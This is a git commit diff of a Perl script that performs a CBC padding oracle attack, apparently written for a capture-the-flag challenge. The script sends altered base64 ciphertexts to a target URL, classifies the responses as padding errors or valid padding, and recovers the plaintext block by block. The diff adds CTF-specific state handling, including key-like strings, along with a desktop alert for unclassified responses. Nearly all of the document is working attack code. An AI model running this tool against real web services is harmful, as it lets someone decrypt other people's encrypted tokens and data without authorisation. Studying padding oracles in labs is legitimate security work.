1903b5f21a0a34cfaa7484faa08f5f68c793afd9
Less-Than-Perfect <Ozzymeadows@tutanota.com>
2020-04-09 12:15:43 -0500

    Prep for additional functionality

--- main.pl
+++ main.pl
@@ -1,5 +1,5 @@
 #!/usr/bin/env perl
-use strict;
+use strict 'refs', 'subs';
 use warnings;
 use HTTP::Tiny;# https://perldoc.perl.org/HTTP/Tiny.html
 use MIME::Base64; 
@@ -33,20 +33,53 @@ $parm = decode_base64($parm);
 my $qLen = length($parm)-1;
 #
 
-print "String Length: ".$qLen."\n";
 
-# Padding length
-my $tempPARM = $parm;
-my $it = 6;
-my $currentB = $qLen-($bSize+$it);
 
-# Add a way to allow users to preemptively add to the arrays
-push @paddingErrors, "PaddingException", "bad";
-push @guuud, "UnicodeDecodeError", "msg";
+my $encrypt = 0; # implement this
+
+# for ctf
+my $ogParm = $parm;
+my $ggEZ;
 #
 
-# Padding length
-my $tempPARM = $parm; my $it = 6; my $currentB = $qLen-($bSize+$it);
+# Add a way to allow users to preemptively add to the arrays
+push @paddingErrors, "PaddingException";
+push @guuud, "UnicodeDecodeError";
+#
+
+
+# Global
+my $it;
+my $tempPARM;
+#
+
+# Remove global?
+my $target = 0;
+my $currentB;
+my $return;
+my $bNum = ($qLen+1)/$bSize;
+my $bt = 0;
+#
+
+if (0){ # Restore internal state #Implement function
+    my $state = 'd212e44ab4670083$FLAG$", "id": "2", "key": "rX139wlYRkyUSl3uCE0iQQ~~"}';
+    my $sL = length($state);
+    $bt = ($sL+$AIM)/16; # check to  make sure its a whole int
+    $AIM = 0; # change this to reflect an incomplete block
+    foreach my $number ( 1 .. $sL){
+        push @text, ord(substr($state, -$number, 1));
+    }
+    #my $sR = length($state)%16;
+    $qLen = $qLen-$bSize*$bt;
+    $parm = substr($parm,  0, $qLen+1); }# Added 1 because it starts from 1 instead of 0.
+
+  #TEMP VARIABLE FIX
+if ($encrypt == 1){ # Decode a cipher text using a cbc padding oracle
+    $qLen = length($parm)-1;
+    print "String Length: ".$qLen."\n";
+    
+    #Padding length
+    my $tempPARM = $parm; $it = 6; my $currentB = $qLen-($bSize+$it);
 substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
 my $return = getRequest($tempPARM); my $limit = 0;
 if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = $bSize+1;} # Make sure this works with other block sizes
@@ -73,38 +106,23 @@ while ($ill < $AIM){
     push @text, $AIM;
     $ill++;
 }
+    #my $truAIM = $AIM;
 # $AIM equals the amount of padding
+    print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
 #
-
-#my $state = 'state=324b26c2eeeb51c3191d212e44ab4670083$FLAG$", "id": "2", "key": "yrIoJt1shYp3XUP87-9eRA~~"}';
-#my $sL = int(length($state)/16);
-#my $lolll = length($state)%16;
-#$qLen = $qLen-$bSize*$sL;
-#$parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
-
-
-
-my $target = 0;
-my $bNum = ($qLen+1)/$bSize;
-print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
-my $bt = 0;
-
 while ($bt < $bNum-1){ # fix jank fix
     $target = $AIM+1, $it = $AIM;
     while($it < $bSize){ findByte(); 
-        my $tempP = "="x(($it+1)*5)." "x(($bSize-($it+1))*5); printf ("\r%d/%d {%s}",1+$it, $bSize, $tempP); }
+            my $tempP = "="x(($it+1)*5)." "x(($bSize-($it+1))*5); printf ("\r%d/%d {%s}",1+$it, $bSize, $tempP); 
+            $it++; }
     printf ("\rBlock %d/%d Complete                                                                          \n", 1+$bt, $bNum);
     $qLen = $qLen-$bSize;
     $parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
     $bt++;
     $AIM = 0;
-    printPlain();
-}
-
+        printPlain(); }
 print "Attack Complete! Your plain text: \n";
-printPlain();
-
-# End -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    printPlain(); }
 
 sub prep { # Preps padding for bit flipping (turns padding from something like \x03\x03\x03 to \x04\x04\x04)
     my $tilAIM = 0;
@@ -122,7 +140,7 @@ sub findByte {# Flips bits untill it get valid padding
     power: foreach my $number (0 .. 255){
         substr($tempPARM, $currentB, 1) = chr($number);
         $return = getRequest($tempPARM);
-        if ($return ){ my $xD = $number^$ogByte^$target; push @text, $xD; $AIM++; $target++; $it++; last; }}
+        if ($return ){ my $xD = $number^$ogByte^$target; push @text, $xD; $target++; $AIM++; last; }}
     unless ( $return ){ while (1){ # Runs if 1 is never returned for any given byte
             print "\n\nCould not find padding for byte $currentB. Do you want to try again ($tries attempts)? (Y/n): ";
             chomp ( my $uinput = <STDIN> );
@@ -134,6 +152,7 @@ sub getRequest { # Send a get request and classify the response
     my $heel = encode_base64($_[0], '');
     if ( $URLEncoding == 1 ){ $heel = uri_escape($heel); }
     elsif ( $URLEncoding == 2) { $heel =~ s/\+/-/ig; $heel =~ s/\//!/ig; $heel =~ s/=/~/ig; }
+    $ggEZ = $heel; # For a CTF
     my $response = HTTP::Tiny->new->get($url.$heel);
     my $htmlResponse = sha256_base64($response->{content});
     if ( grep {$response->{content} =~ $_ } @paddingErrors ){
@@ -141,6 +160,7 @@ sub getRequest { # Send a get request and classify the response
     }elsif( grep {$response->{content} =~ $_ } @guuud ){
         return 1;
     }else{ my $uinput; while(1){
+            system ('zenity --error --text="An unknown HTML page needs classification\!" --title="Warning\!"'); # Probably a more universal way of doing this
             print "\n$url$heel\n\n1 = Padding Error\n2 = Other\n3 = Similar to previous\nEnter your choice: ";
             chomp ($uinput = <STDIN>);
             $uinput = $uinput+0; # Make this better
